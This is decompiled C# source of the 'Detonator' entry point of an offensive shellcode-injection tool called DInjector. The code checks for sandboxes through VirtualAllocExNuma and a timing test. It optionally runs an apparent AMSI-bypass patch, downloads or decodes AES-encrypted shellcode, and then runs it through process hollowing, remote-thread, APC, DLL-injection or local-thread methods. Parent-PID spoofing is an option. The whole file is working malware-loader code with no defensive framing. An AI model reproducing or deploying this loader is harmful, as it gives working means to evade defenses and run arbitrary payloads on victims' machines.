using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace DInjector
{
	// Token: 0x02000008 RID: 8
	internal class Detonator
	{
		// Token: 0x0600001B RID: 27
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect, uint nndPreferred);

		// Token: 0x0600001C RID: 28
		[DllImport("kernel32.dll")]
		private static extern void Sleep(uint dwMilliseconds);

		// Token: 0x0600001D RID: 29 RVA: 0x000031C0 File Offset: 0x000013C0
		private static void Boom(string[] args)
		{
			if (Detonator.VirtualAllocExNuma(Process.GetCurrentProcess().Handle, IntPtr.Zero, 4096U, 12288U, 4U, 0U) == IntPtr.Zero)
			{
				return;
			}
			int num = new Random().Next(2000, 3000);
			double num2 = num / 1000 - 0.5;
			DateTime now = DateTime.Now;
			Detonator.Sleep((uint)num);
			if (DateTime.Now.Subtract(now).TotalSeconds < num2)
			{
				return;
			}
			Dictionary<string, string> dictionary = ArgumentParser.Parse(args);
			try
			{
				if (bool.Parse(dictionary["/am51"]))
				{
					AM51.Patch();
				}
			}
			catch (Exception)
			{
			}
			string text = string.Empty;
			foreach (KeyValuePair<string, string> keyValuePair in dictionary)
			{
				if (keyValuePair.Value == string.Empty)
				{
					text = keyValuePair.Key;
				}
			}
			string text2 = dictionary["/sc"];
			string password = dictionary["/password"];
			byte[] data;
			if (text2.IndexOf("http", StringComparison.OrdinalIgnoreCase) >= 0)
			{
				Console.WriteLine("(Detonator) [*] Loading shellcode from URL");
				WebClient webClient = new WebClient();
				ServicePointManager.SecurityProtocol = (SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
				MemoryStream memoryStream = new MemoryStream(webClient.DownloadData(text2));
				data = new BinaryReader(memoryStream).ReadBytes(Convert.ToInt32(memoryStream.Length));
			}
			else
			{
				Console.WriteLine("(Detonator) [*] Loading shellcode from base64 input");
				data = Convert.FromBase64String(text2);
			}
			byte[] array = new AES(password).Decrypt(data);
			int ppid = 0;
			try
			{
				ppid = int.Parse(dictionary["/ppid"]);
			}
			catch (Exception)
			{
			}
			bool blockDlls = false;
			try
			{
				if (bool.Parse(dictionary["/blockDlls"]))
				{
					blockDlls = true;
				}
			}
			catch (Exception)
			{
			}
			uint num3 = <PrivateImplementationDetails>.ComputeStringHash(text);
			if (num3 <= 1633653762U)
			{
				if (num3 <= 1013440982U)
				{
					if (num3 != 597187931U)
					{
						if (num3 != 886880049U)
						{
							if (num3 != 1013440982U)
							{
								return;
							}
							if (!(text == "functionpointerv2"))
							{
								return;
							}
							FunctionPointerV2.Execute(array);
							return;
						}
						else
						{
							if (!(text == "processhollow"))
							{
								return;
							}
							ProcessHollow.Execute(array, dictionary["/image"], ppid, blockDlls);
							return;
						}
					}
					else
					{
						if (!(text == "remotethread"))
						{
							return;
						}
						RemoteThread.Execute(array, int.Parse(dictionary["/pid"]));
						return;
					}
				}
				else if (num3 != 1337743390U)
				{
					if (num3 != 1581928577U)
					{
						if (num3 != 1633653762U)
						{
							return;
						}
						if (!(text == "remotethreadcontext"))
						{
							return;
						}
						RemoteThreadContext.Execute(array, dictionary["/image"], ppid, blockDlls);
						return;
					}
					else
					{
						if (!(text == "currentthreaduuid"))
						{
							return;
						}
						CurrentThreadUuid.Execute(Encoding.UTF8.GetString(array));
						return;
					}
				}
				else
				{
					if (!(text == "clipboardpointer"))
					{
						return;
					}
					ClipboardPointer.Execute(array);
					return;
				}
			}
			else if (num3 <= 2585521376U)
			{
				if (num3 != 2000324974U)
				{
					if (num3 != 2145053022U)
					{
						if (num3 != 2585521376U)
						{
							return;
						}
						if (!(text == "remotethreadsuspended"))
						{
							return;
						}
						RemoteThreadSuspended.Execute(array, int.Parse(dictionary["/pid"]));
						return;
					}
					else
					{
						if (!(text == "currentthread"))
						{
							return;
						}
						CurrentThread.Execute(array);
						return;
					}
				}
				else
				{
					if (!(text == "remotethreadview"))
					{
						return;
					}
					RemoteThreadView.Execute(array, int.Parse(dictionary["/pid"]));
					return;
				}
			}
			else if (num3 != 2602728598U)
			{
				if (num3 != 3284651259U)
				{
					if (num3 != 3819032365U)
					{
						return;
					}
					if (!(text == "remotethreaddll"))
					{
						return;
					}
					RemoteThreadDll.Execute(array, int.Parse(dictionary["/pid"]), dictionary["/dll"]);
					return;
				}
				else
				{
					if (!(text == "remotethreadapc"))
					{
						return;
					}
					RemoteThreadAPC.Execute(array, dictionary["/image"], ppid, blockDlls);
					return;
				}
			}
			else
			{
				if (!(text == "functionpointer"))
				{
					return;
				}
				FunctionPointer.Execute(array);
				return;
			}
		}
	}
}
